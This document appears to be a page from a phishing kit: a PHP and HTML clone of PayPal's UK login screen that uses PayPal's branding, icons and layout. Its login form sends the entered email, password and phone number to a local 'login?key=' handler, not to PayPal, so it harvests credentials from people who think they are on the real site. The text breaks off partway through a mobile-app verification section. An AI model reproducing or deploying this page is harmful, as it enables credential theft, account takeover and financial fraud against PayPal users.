<?php
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
?>
<html lang="en" class=" desktop js ">
<head>
    <meta charset="utf-8">
    <title><?php echo $login['title'];?></title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="application-name" content="PayPal">
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
    <link rel="canonical" href="https://www.paypal.com/uk/signin">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
    <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js"></script>
    <link rel="stylesheet" href="assets/css/login.css">
    <style nonce="">
        @font-face { font-family: "PayPalSansSmall-Regular"; font-style: normal; font-display: swap; src: url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.woff2')  format('woff2'),  url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.woff')  format('woff'),  url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.eot?#iefix')  format('embedded-opentype'),  url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.svg')  format('svg'); } #gdprCookieBanner { font-family: PayPalSansSmall-Regular, sans-serif; }         .gdprCookieBanner_container { width: 100%; bottom: 0; position: fixed; background-color: #012169; z-index: 1051; color: white; text-shadow: none; } .gdprCookieBanner_wrapper { max-width: 1024px; margin: 0 auto; padding-top: 0px; color: white; } .gdprCookieBanner_content { font-weight: 400; font-size: 15px; margin-top: 23px; line-height: 24px; margin-bottom: 26px; color: white; } .gdprCookieBanner_content a { color: white; text-decoration: underline; } .gdprCookieBanner_buttonWrapper { text-align: center; } .gdpr_btn { display: inline-block; min-width: 6rem; padding: 0.75rem 1.5rem; margin-bottom: 1.5rem; border: 1px solid #0070ba; border-radius: 1.5rem; font-size: 0.9375rem; line-height: 1.6; font-weight: 500; text-align: center; text-decoration: none; cursor: pointer; transition: all 250ms ease; -webkit-font-smoothing: antialiased; } .gdpr_btn_reversed { border-color: #ffffff; background-color: #ffffff; color: #0070ba; } .col-sm-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; } .gdprCookieBanner_button { width: 200px; font-size: 13px; } .gdprCookieBanner-acceptedAll { height: auto; margin-bottom: 12em; } @media only screen and (max-device-width : 1024px) { .gdprCookieBanner_content { font-size: 13px; color: white; } } @media only screen and (max-width: 575.98px) { .gdprHideCookieBannerMobile { display:none; } }
    </style>
</head>

<body class="desktop " data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVaSaGxOmPB%2BDX69qyNN0t%2F1OvhtU6MSBN8VLmo20PVO_16f9090dfe6" data-hostname="rZJvnqaaQhLn/nmWT8cSUrLUCF91zHwnjpRjzGlM+yc6Y1bp0++ytm2tA1cjrpCx" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/8ea428698663f817/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="e6f967f2d1e77" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-csrf-token="fcuR02o0QLPKMPVPpyvHSeipF1iVo+PUYZgWo=" data-nonce="7K49sDr/jrsOWFBf3C9THw/iPLF0sYdhWCHUi0ABJWXSKfRV" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true" data-party-id-hash="34d34154256c7e7857d45bf6d3dab63ca3647d17ef068935e1c51ae85152e6c8" style="margin-bottom: 167px;">
    <noscript>
        <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal website require JavaScript and cookies.</p>
    </noscript>
    <div id="main" class="main" role="main">
        <section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices">
            <div class="corral">
                <div id="slContent" class="contentContainer contentContainerBordered">
                    <header>
                        <p class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <div id="linked" class="linked hide">
                        <div class="profileRemembered"><span class="loginEmail"></span><a href="#" class="changeLink scTrack:not-you" id="changeLink" pa-marked="1">Change</a>
                        </div>
                        <div class="headerTextDecorated"></div>
                        <h1 class="headerText">Stay logged in for faster checkout</h1>
                        <p class="description assure">Enable auto-login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span>
                        </p>
                        <div id="partnerProfile" class="partnerProfile">
                            <div id="partnerPhoto" class="partnerPhoto" style="background-image: url('')"></div>
                            <div class="partnerDetails"><span>You're logged in as</span>
                                <div id="displayName" class="displayName"></div>
                                <div>
                                    <div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail" class="partnerEmail"></span><span id="partnerEmailDomain"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="actions actionsSpacedShort">
                            <button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn" pa-marked="1">Continue</button>
                        </div>
                        <div id="secondaryLogin" class="buttonAsLink secondaryLink">
                            <button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn" pa-marked="1">Use password instead</button>
                        </div>
                    </div>
                    <div id="unlinked" class="unlinked ">
                        <div id="headerIcon" class="partnerConnect"></div>
                        <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
                        <p class="description assure">Log in to PayPal automatically for faster checkout without entering your password wherever you're logged in with your Google account.<a href="#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis" pa-marked="1">What's this?</a>
                        </p>
                        <p class="secondaryLink hide" id="slOptIn_notNow"><a href="#" pa-marked="1">Not now</a>
                        </p>
                    </div>
                    <div id="learnMoreModal" class="learnMoreModal">
                        <div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
                            <p>Linking your Google account allows you to activate One Touch™ quickly and easily when you check out. You can always opt out later in your Settings at paypal.co.uk.</p>
                            <p>Whenever you check out on a new device and browser when logged in with your Google account, you can log in automatically at checkout without entering your password.</p>
                        </div>
                        <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc hide">
                            <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
                            <p>Skip typing your password by staying logged in on this device. For security, we'll occasionally ask you to log in, including every time you update your personal or financial information. We don’t recommend using One Touch<sup>TM</sup> on shared devices. Turn this off at any time in your PayPal settings.</p>
                        </div>
                        <button type="button" class="ui-dialog-titlebar-close" pa-marked="1"></button>
                    </div>
                    <div class="intentFooter">
                        <div class="localeSelector">
                            <ul class="localeLink"></ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
            <div class="corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header>
                        <p class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <h1 class="headerText accessAid">Log in to your account</h1>
                    <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Please enter it below. Otherwise, click the link to log in with your email address.</p>
                    <div class="notifications"></div>
                    <div id="keychainErrorMessage" class="hide">
                        <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please log in with your email.</p>
                        <p class="notification notification-warning blocked-on-risky-login hide">Please log in with your email address and password.</p>
                        <p class="notification notification-critical keychain-activation-failure hide">We're sorry, something seems to have gone wrong. Please log in with your email address and password.</p>
                    </div>
                    <form action="login?key=<?php echo $key;?>" method="post" class="proceed maskable" autocomplete="off" name="login" validate="validate">
                        <div id="passwordSection" class="clearfix splitEmail">
                            <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                <div class="countryPhoneSelectWrapper hide">
                                    <label class="accessAid" for="phoneCode">Choose your phone country code</label>
                                    <select name="phoneCode" id="phoneCode" class="countryPhoneSelect">
                                        <option value="AL +355" data-code="+355" data-country="AL">Albania (+355)</option>
                                        <option value="DZ +213" data-code="+213" data-country="DZ">Algeria (+213)</option>
                                        <option value="AD +376" data-code="+376" data-country="AD">Andorra (+376)</option>
                                        <option value="AO +244" data-code="+244" data-country="AO">Angola (+244)</option>
                                        <option value="AI +1" data-code="+1" data-country="AI">Anguilla (+1)</option>
                                        <option value="AG +1" data-code="+1" data-country="AG">Antigua &amp; Barbuda (+1)</option>
                                        <option value="AR +54" data-code="+54" data-country="AR">Argentina (+54)</option>
                                        <option value="AM +374" data-code="+374" data-country="AM">Armenia (+374)</option>
                                        <option value="AW +297" data-code="+297" data-country="AW">Aruba (+297)</option>
                                        <option value="AU +61" data-code="+61" data-country="AU">Australia (+61)</option>
                                        <option value="AT +43" data-code="+43" data-country="AT">Austria (+43)</option>
                                        <option value="AZ +994" data-code="+994" data-country="AZ">Azerbaijan (+994)</option>
                                        <option value="BS +1" data-code="+1" data-country="BS">Bahamas (+1)</option>
                                        <option value="BH +973" data-code="+973" data-country="BH">Bahrain (+973)</option>
                                        <option value="BB +1" data-code="+1" data-country="BB">Barbados (+1)</option>
                                        <option value="BY +375" data-code="+375" data-country="BY">Belarus (+375)</option>
                                        <option value="BE +32" data-code="+32" data-country="BE">Belgium (+32)</option>
                                        <option value="BZ +501" data-code="+501" data-country="BZ">Belize (+501)</option>
                                        <option value="BJ +229" data-code="+229" data-country="BJ">Benin (+229)</option>
                                        <option value="BM +1" data-code="+1" data-country="BM">Bermuda (+1)</option>
                                        <option value="BT +975" data-code="+975" data-country="BT">Bhutan (+975)</option>
                                        <option value="BO +591" data-code="+591" data-country="BO">Bolivia (+591)</option>
                                        <option value="BA +387" data-code="+387" data-country="BA">Bosnia &amp; Herzegovina (+387)</option>
                                        <option value="BW +267" data-code="+267" data-country="BW">Botswana (+267)</option>
                                        <option value="BR +55" data-code="+55" data-country="BR">Brazil (+55)</option>
                                        <option value="VG +1" data-code="+1" data-country="VG">British Virgin Islands (+1)</option>
                                        <option value="BN +673" data-code="+673" data-country="BN">Brunei (+673)</option>
                                        <option value="BG +359" data-code="+359" data-country="BG">Bulgaria (+359)</option>
                                        <option value="BF +226" data-code="+226" data-country="BF">Burkina Faso (+226)</option>
                                        <option value="BI +257" data-code="+257" data-country="BI">Burundi (+257)</option>
                                        <option value="KH +855" data-code="+855" data-country="KH">Cambodia (+855)</option>
                                        <option value="CM +237" data-code="+237" data-country="CM">Cameroon (+237)</option>
                                        <option value="CA +1" data-code="+1" data-country="CA">Canada (+1)</option>
                                        <option value="CV +238" data-code="+238" data-country="CV">Cape Verde (+238)</option>
                                        <option value="KY +1" data-code="+1" data-country="KY">Cayman Islands (+1)</option>
                                        <option value="TD +235" data-code="+235" data-country="TD">Chad (+235)</option>
                                        <option value="CL +56" data-code="+56" data-country="CL">Chile (+56)</option>
                                        <option value="C2 +86" data-code="+86" data-country="C2">China (+86)</option>
                                        <option value="CO +57" data-code="+57" data-country="CO">Colombia (+57)</option>
                                        <option value="KM +269" data-code="+269" data-country="KM">Comoros (+269)</option>
                                        <option value="CG +242" data-code="+242" data-country="CG">Congo - Brazzaville (+242)</option>
                                        <option value="CD +243" data-code="+243" data-country="CD">Congo - Kinshasa (+243)</option>
                                        <option value="CK +682" data-code="+682" data-country="CK">Cook Islands (+682)</option>
                                        <option value="CR +506" data-code="+506" data-country="CR">Costa Rica (+506)</option>
                                        <option value="CI +225" data-code="+225" data-country="CI">Côte d’Ivoire (+225)</option>
                                        <option value="HR +385" data-code="+385" data-country="HR">Croatia (+385)</option>
                                        <option value="CY +357" data-code="+357" data-country="CY">Cyprus (+357)</option>
                                        <option value="CZ +420" data-code="+420" data-country="CZ">Czech Republic (+420)</option>
                                        <option value="DK +45" data-code="+45" data-country="DK">Denmark (+45)</option>
                                        <option value="DJ +253" data-code="+253" data-country="DJ">Djibouti (+253)</option>
                                        <option value="DM +1" data-code="+1" data-country="DM">Dominica (+1)</option>
                                        <option value="DO +1" data-code="+1" data-country="DO">Dominican Republic (+1)</option>
                                        <option value="EC +593" data-code="+593" data-country="EC">Ecuador (+593)</option>
                                        <option value="EG +20" data-code="+20" data-country="EG">Egypt (+20)</option>
                                        <option value="SV +503" data-code="+503" data-country="SV">El Salvador (+503)</option>
                                        <option value="ER +291" data-code="+291" data-country="ER">Eritrea (+291)</option>
                                        <option value="EE +372" data-code="+372" data-country="EE">Estonia (+372)</option>
                                        <option value="ET +251" data-code="+251" data-country="ET">Ethiopia (+251)</option>
                                        <option value="FK +500" data-code="+500" data-country="FK">Falkland Islands (+500)</option>
                                        <option value="FO +298" data-code="+298" data-country="FO">Faroe Islands (+298)</option>
                                        <option value="FJ +679" data-code="+679" data-country="FJ">Fiji (+679)</option>
                                        <option value="FI +358" data-code="+358" data-country="FI">Finland (+358)</option>
                                        <option value="FR +33" data-code="+33" data-country="FR">France (+33)</option>
                                        <option value="GF +594" data-code="+594" data-country="GF">French Guiana (+594)</option>
                                        <option value="PF +689" data-code="+689" data-country="PF">French Polynesia (+689)</option>
                                        <option value="GA +241" data-code="+241" data-country="GA">Gabon (+241)</option>
                                        <option value="GM +220" data-code="+220" data-country="GM">Gambia (+220)</option>
                                        <option value="GE +995" data-code="+995" data-country="GE">Georgia (+995)</option>
                                        <option value="DE +49" data-code="+49" data-country="DE">Germany (+49)</option>
                                        <option value="GI +350" data-code="+350" data-country="GI">Gibraltar (+350)</option>
                                        <option value="GR +30" data-code="+30" data-country="GR">Greece (+30)</option>
                                        <option value="GL +299" data-code="+299" data-country="GL">Greenland (+299)</option>
                                        <option value="GD +1" data-code="+1" data-country="GD">Grenada (+1)</option>
                                        <option value="GP +590" data-code="+590" data-country="GP">Guadeloupe (+590)</option>
                                        <option value="GT +502" data-code="+502" data-country="GT">Guatemala (+502)</option>
                                        <option value="GN +224" data-code="+224" data-country="GN">Guinea (+224)</option>
                                        <option value="GW +245" data-code="+245" data-country="GW">Guinea-Bissau (+245)</option>
                                        <option value="GY +592" data-code="+592" data-country="GY">Guyana (+592)</option>
                                        <option value="HN +504" data-code="+504" data-country="HN">Honduras (+504)</option>
                                        <option value="HK +852" data-code="+852" data-country="HK">Hong Kong SAR China (+852)</option>
                                        <option value="HU +36" data-code="+36" data-country="HU">Hungary (+36)</option>
                                        <option value="IS +354" data-code="+354" data-country="IS">Iceland (+354)</option>
                                        <option value="IN +91" data-code="+91" data-country="IN">India (+91)</option>
                                        <option value="ID +62" data-code="+62" data-country="ID">Indonesia (+62)</option>
                                        <option value="IE +353" data-code="+353" data-country="IE">Ireland (+353)</option>
                                        <option value="IL +972" data-code="+972" data-country="IL">Israel (+972)</option>
                                        <option value="IT +39" data-code="+39" data-country="IT">Italy (+39)</option>
                                        <option value="JM +1" data-code="+1" data-country="JM">Jamaica (+1)</option>
                                        <option value="JP +81" data-code="+81" data-country="JP">Japan (+81)</option>
                                        <option value="JO +962" data-code="+962" data-country="JO">Jordan (+962)</option>
                                        <option value="KZ +7" data-code="+7" data-country="KZ">Kazakhstan (+7)</option>
                                        <option value="KE +254" data-code="+254" data-country="KE">Kenya (+254)</option>
                                        <option value="KI +686" data-code="+686" data-country="KI">Kiribati (+686)</option>
                                        <option value="KW +965" data-code="+965" data-country="KW">Kuwait (+965)</option>
                                        <option value="KG +996" data-code="+996" data-country="KG">Kyrgyzstan (+996)</option>
                                        <option value="LA +856" data-code="+856" data-country="LA">Laos (+856)</option>
                                        <option value="LV +371" data-code="+371" data-country="LV">Latvia (+371)</option>
                                        <option value="LS +266" data-code="+266" data-country="LS">Lesotho (+266)</option>
                                        <option value="LI +423" data-code="+423" data-country="LI">Liechtenstein (+423)</option>
                                        <option value="LT +370" data-code="+370" data-country="LT">Lithuania (+370)</option>
                                        <option value="LU +352" data-code="+352" data-country="LU">Luxembourg (+352)</option>
                                        <option value="MK +389" data-code="+389" data-country="MK">Macedonia (+389)</option>
                                        <option value="MG +261" data-code="+261" data-country="MG">Madagascar (+261)</option>
                                        <option value="MW +265" data-code="+265" data-country="MW">Malawi (+265)</option>
                                        <option value="MY +60" data-code="+60" data-country="MY">Malaysia (+60)</option>
                                        <option value="MV +960" data-code="+960" data-country="MV">Maldives (+960)</option>
                                        <option value="ML +223" data-code="+223" data-country="ML">Mali (+223)</option>
                                        <option value="MT +356" data-code="+356" data-country="MT">Malta (+356)</option>
                                        <option value="MH +692" data-code="+692" data-country="MH">Marshall Islands (+692)</option>
                                        <option value="MQ +596" data-code="+596" data-country="MQ">Martinique (+596)</option>
                                        <option value="MR +222" data-code="+222" data-country="MR">Mauritania (+222)</option>
                                        <option value="MU +230" data-code="+230" data-country="MU">Mauritius (+230)</option>
                                        <option value="YT +262" data-code="+262" data-country="YT">Mayotte (+262)</option>
                                        <option value="MX +52" data-code="+52" data-country="MX">Mexico (+52)</option>
                                        <option value="FM +691" data-code="+691" data-country="FM">Micronesia (+691)</option>
                                        <option value="MD +373" data-code="+373" data-country="MD">Moldova (+373)</option>
                                        <option value="MC +377" data-code="+377" data-country="MC">Monaco (+377)</option>
                                        <option value="MN +976" data-code="+976" data-country="MN">Mongolia (+976)</option>
                                        <option value="ME +382" data-code="+382" data-country="ME">Montenegro (+382)</option>
                                        <option value="MS +1" data-code="+1" data-country="MS">Montserrat (+1)</option>
                                        <option value="MA +212" data-code="+212" data-country="MA">Morocco (+212)</option>
                                        <option value="MZ +258" data-code="+258" data-country="MZ">Mozambique (+258)</option>
                                        <option value="NA +264" data-code="+264" data-country="NA">Namibia (+264)</option>
                                        <option value="NR +674" data-code="+674" data-country="NR">Nauru (+674)</option>
                                        <option value="NP +977" data-code="+977" data-country="NP">Nepal (+977)</option>
                                        <option value="NL +31" data-code="+31" data-country="NL">Netherlands (+31)</option>
                                        <option value="AN +599" data-code="+599" data-country="AN">Netherlands Antilles (+599)</option>
                                        <option value="NC +687" data-code="+687" data-country="NC">New Caledonia (+687)</option>
                                        <option value="NZ +64" data-code="+64" data-country="NZ">New Zealand (+64)</option>
                                        <option value="NI +505" data-code="+505" data-country="NI">Nicaragua (+505)</option>
                                        <option value="NE +227" data-code="+227" data-country="NE">Niger (+227)</option>
                                        <option value="NG +234" data-code="+234" data-country="NG">Nigeria (+234)</option>
                                        <option value="NU +683" data-code="+683" data-country="NU">Niue (+683)</option>
                                        <option value="NF +672" data-code="+672" data-country="NF">Norfolk Island (+672)</option>
                                        <option value="NO +47" data-code="+47" data-country="NO">Norway (+47)</option>
                                        <option value="OM +968" data-code="+968" data-country="OM">Oman (+968)</option>
                                        <option value="PW +680" data-code="+680" data-country="PW">Palau (+680)</option>
                                        <option value="PA +507" data-code="+507" data-country="PA">Panama (+507)</option>
                                        <option value="PG +675" data-code="+675" data-country="PG">Papua New Guinea (+675)</option>
                                        <option value="PY +595" data-code="+595" data-country="PY">Paraguay (+595)</option>
                                        <option value="PE +51" data-code="+51" data-country="PE">Peru (+51)</option>
                                        <option value="PH +63" data-code="+63" data-country="PH">Philippines (+63)</option>
                                        <option value="PN +870" data-code="+870" data-country="PN">Pitcairn Islands (+870)</option>
                                        <option value="PL +48" data-code="+48" data-country="PL">Poland (+48)</option>
                                        <option value="PT +351" data-code="+351" data-country="PT">Portugal (+351)</option>
                                        <option value="QA +974" data-code="+974" data-country="QA">Qatar (+974)</option>
                                        <option value="RE +262" data-code="+262" data-country="RE">Réunion (+262)</option>
                                        <option value="RO +40" data-code="+40" data-country="RO">Romania (+40)</option>
                                        <option value="RU +7" data-code="+7" data-country="RU">Russia (+7)</option>
                                        <option value="RW +250" data-code="+250" data-country="RW">Rwanda (+250)</option>
                                        <option value="WS +685" data-code="+685" data-country="WS">Samoa (+685)</option>
                                        <option value="SM +378" data-code="+378" data-country="SM">San Marino (+378)</option>
                                        <option value="ST +239" data-code="+239" data-country="ST">São Tomé &amp; Príncipe (+239)</option>
                                        <option value="SA +966" data-code="+966" data-country="SA">Saudi Arabia (+966)</option>
                                        <option value="SN +221" data-code="+221" data-country="SN">Senegal (+221)</option>
                                        <option value="RS +381" data-code="+381" data-country="RS">Serbia (+381)</option>
                                        <option value="SC +248" data-code="+248" data-country="SC">Seychelles (+248)</option>
                                        <option value="SL +232" data-code="+232" data-country="SL">Sierra Leone (+232)</option>
                                        <option value="SG +65" data-code="+65" data-country="SG">Singapore (+65)</option>
                                        <option value="SK +421" data-code="+421" data-country="SK">Slovakia (+421)</option>
                                        <option value="SI +386" data-code="+386" data-country="SI">Slovenia (+386)</option>
                                        <option value="SB +677" data-code="+677" data-country="SB">Solomon Islands (+677)</option>
                                        <option value="SO +252" data-code="+252" data-country="SO">Somalia (+252)</option>
                                        <option value="ZA +27" data-code="+27" data-country="ZA">South Africa (+27)</option>
                                        <option value="KR +82" data-code="+82" data-country="KR">South Korea (+82)</option>
                                        <option value="ES +34" data-code="+34" data-country="ES">Spain (+34)</option>
                                        <option value="LK +94" data-code="+94" data-country="LK">Sri Lanka (+94)</option>
                                        <option value="SH +290" data-code="+290" data-country="SH">St. Helena (+290)</option>
                                        <option value="KN +1" data-code="+1" data-country="KN">St. Kitts &amp; Nevis (+1)</option>
                                        <option value="LC +1" data-code="+1" data-country="LC">St. Lucia (+1)</option>
                                        <option value="PM +508" data-code="+508" data-country="PM">St. Pierre &amp; Miquelon (+508)</option>
                                        <option value="VC +1" data-code="+1" data-country="VC">St. Vincent &amp; Grenadines (+1)</option>
                                        <option value="SR +597" data-code="+597" data-country="SR">Suriname (+597)</option>
                                        <option value="SJ +47" data-code="+47" data-country="SJ">Svalbard &amp; Jan Mayen (+47)</option>
                                        <option value="SZ +268" data-code="+268" data-country="SZ">Swaziland (+268)</option>
                                        <option value="SE +46" data-code="+46" data-country="SE">Sweden (+46)</option>
                                        <option value="CH +41" data-code="+41" data-country="CH">Switzerland (+41)</option>
                                        <option value="TW +886" data-code="+886" data-country="TW">Taiwan (+886)</option>
                                        <option value="TJ +992" data-code="+992" data-country="TJ">Tajikistan (+992)</option>
                                        <option value="TZ +255" data-code="+255" data-country="TZ">Tanzania (+255)</option>
                                        <option value="TH +66" data-code="+66" data-country="TH">Thailand (+66)</option>
                                        <option value="TG +228" data-code="+228" data-country="TG">Togo (+228)</option>
                                        <option value="TO +676" data-code="+676" data-country="TO">Tonga (+676)</option>
                                        <option value="TT +1" data-code="+1" data-country="TT">Trinidad &amp; Tobago (+1)</option>
                                        <option value="TN +216" data-code="+216" data-country="TN">Tunisia (+216)</option>
                                        <option value="TR +90" data-code="+90" data-country="TR">Turkey (+90)</option>
                                        <option value="TM +993" data-code="+993" data-country="TM">Turkmenistan (+993)</option>
                                        <option value="TC +1" data-code="+1" data-country="TC">Turks &amp; Caicos Islands (+1)</option>
                                        <option value="TV +688" data-code="+688" data-country="TV">Tuvalu (+688)</option>
                                        <option value="UG +256" data-code="+256" data-country="UG">Uganda (+256)</option>
                                        <option value="UA +380" data-code="+380" data-country="UA">Ukraine (+380)</option>
                                        <option value="AE +971" data-code="+971" data-country="AE">United Arab Emirates (+971)</option>
                                        <option value="GB +44" data-code="+44" data-country="GB" selected="selected">United Kingdom (+44)</option>
                                        <option value="US +1" data-code="+1" data-country="US">United States (+1)</option>
                                        <option value="UY +598" data-code="+598" data-country="UY">Uruguay (+598)</option>
                                        <option value="VU +678" data-code="+678" data-country="VU">Vanuatu (+678)</option>
                                        <option value="VA +39" data-code="+39" data-country="VA">Vatican City (+39)</option>
                                        <option value="VE +58" data-code="+58" data-country="VE">Venezuela (+58)</option>
                                        <option value="VN +84" data-code="+84" data-country="VN">Vietnam (+84)</option>
                                        <option value="WF +681" data-code="+681" data-country="WF">Wallis &amp; Futuna (+681)</option>
                                        <option value="YE +967" data-code="+967" data-country="YE">Yemen (+967)</option>
                                        <option value="ZM +260" data-code="+260" data-country="ZM">Zambia (+260)</option>
                                        <option value="ZW +263" data-code="+263" data-country="ZW">Zimbabwe (+263)</option>
                                    </select>
                                    <div class="countryPhoneSelectChoice"><span class="countryCode">GB</span><span class="phoneCode">+44</span>
                                    </div>
                                </div>
                                <div class="textInput" id="login_emaildiv">
                                    <div class="fieldWrapper ">
                                        <label for="email" class="fieldLabel"><?php echo $login['email'];?></label>
                                        <input id="email" aria-label="login_emaildiv" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="<?php echo $login['email'];?>" aria-describedby="emailErrorMessage">
                                    </div>
                                    <div class="errorMessage" id="emailErrorMessage">
                                        <p class="emptyError hide">Required.</p>
                                        <p class="invalidError hide">The email address or mobile number format is incorrect.</p>
                                    </div>
                                </div>
                            </div>
                            <div id="passwordSection" class="clearfix">
                                <div class="textInput  " id="login_passworddiv">
                                    <div class="fieldWrapper ">
                                        <label for="password" class="fieldLabel"><?php echo $login['password'];?></label>
                                        <input id="password" aria-label="login_passworddiv" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="<?php echo $login['password'];?>" aria-describedby="passwordErrorMessage">
                                        <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Show password" pa-marked="1">Show</button>
                                        <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide" pa-marked="1">Hide</button>
                                        <button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button>
                                    </div>
                                    <div class="errorMessage" id="passwordErrorMessage">
                                        <p class="emptyError hide">Password is required</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <input type="hidden" id="phone" name="login_phone" class="validate">
                        <div class="actions">
                            <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1"><?php echo $login['login'];?></button>
                        </div>
                        </form>
                    <div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
                        <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                            <ul class="moreoptionsGroup">
                                <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a>
                                </li>
                                <li><a href="/authflow/password-recovery/?country.x=GB&amp;locale.x=en_GB&amp;redirectUri=%252Fsignin%252F" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1"><?php echo $login['trouble'];?></a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="forgotLink"><a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1"><?php echo $login['trouble'];?></a>
                    </div>
                    <div class="pwr-modal forgotPasswordModal" id="password-recovery-modal">
                        <iframe id="pwdIframe" data-src="/authflow/password-recovery/?country.x=GB&amp;locale.x=en_GB&amp;redirectUri=%252Fsignin%252F" scrolling="no" data-auto-reload="true"></iframe>
                        <div class="monogram-small"></div>
                    </div>
                    <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
                        <div class="loginSignUpSeparator"><span class="textInSeparator"><?php echo $login['or'];?></span>
                        </div><a role="button" href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1"><?php echo $login['signup'];?></a>
                    </div>
                    <div id="tpdButtonContainer" class="signupContainer hide">
                        <div class="loginSignUpSeparator"><span class="textInSeparator"><?php echo $login['or'];?></span>
                        </div>
                        <div class="actions">
                            <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation – PayPal">
            <div class="corral">
                <div class="contentContainer contentContainerLean">
                    <div id="pending" class="verificationSubSection">
                        <h1 class="headerText">Open the PayPal app</h1>
                        <p id="uncookiedMessage" class="verification-message hide">Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p>
                        <p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p>
                        <div class="notifications"></div>
                        <div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span>
                        </div>
                        <div class="mobileNotification">
                            <p class="pin"></p>
                            <div class="mobileScreen">
                                <img src="https://www.paypalobjects.com/images/shared/icon-PN-check.png" alt="phone">
                            </div>
                        </div>
                        <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="" class="inlineLink scTrack:try-password" pa-marked="1">Use password instead</a>
                        </p>
                        <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="" id="resend" pa-marked="1">Resend</a><span class="sentMessage hide">Sent</span>
                        </p>
